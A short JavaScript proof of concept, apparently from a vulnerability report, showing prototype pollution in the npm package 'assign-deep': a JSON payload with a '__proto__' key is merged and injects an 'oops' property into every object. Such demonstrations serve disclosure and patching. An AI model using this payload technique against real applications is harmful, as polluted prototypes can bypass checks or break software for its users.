var assign = require('assign-deep');
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
var a = {};
console.log("Before : " + a.oops);
assign({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);
